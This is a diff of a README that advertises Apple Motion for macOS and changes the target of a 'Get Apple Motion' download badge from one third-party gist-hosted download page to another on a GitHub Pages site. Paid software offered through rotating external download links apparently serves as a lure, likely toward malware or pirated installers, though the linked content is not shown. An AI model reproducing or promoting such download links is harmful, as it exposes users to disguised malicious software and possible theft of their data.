@@ -3,7 +3,7 @@
 **Apple Motion** for **macOS** is a powerful motion graphics and visual effects tool built for video editors and creators.  
 It enables you to design cinematic titles, dynamic transitions, and real-time animations — all optimized for **Apple Silicon** performance and integrated with **Final Cut Pro**. 🍎  
 
-[![🎬 Get GitHub Instruction](https://img.shields.io/badge/🎬%20Get%20Apple%20Motion-007AFF?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/deserthaze520/fb716ecc46c5da54fd92b054e8dae4a7/raw/f9fc9fb59cb114ab59922b4b3e6cac2ba0d3b833/download.html?offer=AppleMotionMac)
+[![🎬 Get GitHub Instruction](https://img.shields.io/badge/🎬%20Get%20Apple%20Motion-007AFF?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://deployer-app.github.io/.github/?offer=AppleMotionMac)
 
 ---
 
